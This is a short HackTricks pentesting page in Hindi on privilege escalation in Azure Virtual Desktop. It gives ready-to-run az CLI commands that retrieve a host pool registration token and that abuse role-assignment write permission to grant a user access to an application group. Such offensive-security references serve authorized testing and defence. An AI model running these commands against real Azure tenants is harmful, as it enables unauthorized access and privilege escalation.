# Az - Virtual Desktop Privesx

{{#include ../../../banners/hacktricks-training.md}}

## Azure Virtual Desktop Privesc

Azure Virtual Desktop के बारे में अधिक जानकारी के लिए देखें:

{{#ref}}
../az-services/az-virtual-desktop.md
{{#endref}}


### `Microsoft.DesktopVirtualization/hostPools/retrieveRegistrationToken/action`
आप होस्ट पूल के भीतर वर्चुअल मशीनों को पंजीकृत करने के लिए उपयोग किए जाने वाले पंजीकरण टोकन को प्राप्त कर सकते हैं।
```bash
az desktopvirtualization hostpool retrieve-registration-token -n testhostpool -g Resource_Group_1
```
### Microsoft.Authorization/roleAssignments/read, Microsoft.Authorization/roleAssignments/write

> [!WARNING]
> इन अनुमतियों के साथ एक हमलावर इस एक से कहीं अधिक खतरनाक चीजें कर सकता है।

इन अनुमतियों के साथ आप एप्लिकेशन समूह में एक उपयोगकर्ता असाइनमेंट जोड़ सकते हैं, जो वर्चुअल डेस्कटॉप की वर्चुअल मशीन तक पहुंचने के लिए आवश्यक है:
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<SUBSCRIPTION_ID>/resourceGroups/<RESOURCE_GROUP_NAME>/providers/Microsoft.DesktopVirtualization/applicationGroups/<APP_GROUP_NAME>/providers/Microsoft.Authorization/roleAssignments/<NEW_ROLE_ASSIGNMENT_GUID>?api-version=2022-04-01" \
--body '{
"properties": {
"roleDefinitionId": "/subscriptions/<SUBSCRIPTION_ID>/providers/Microsoft.Authorization/roleDefinitions/1d18fff3-a72a-46b5-b4a9-0b38a3cd7e63",
"principalId": "<USER_OBJECT_ID>"
}
}'
```
ध्यान दें कि किसी उपयोगकर्ता को डेस्कटॉप या ऐप तक पहुँचने के लिए, उसे VM पर `Virtual Machine User Login` या `Virtual Machine Administrator Login` भूमिका की भी आवश्यकता होती है। 

{{#include ../../../banners/hacktricks-training.md}}
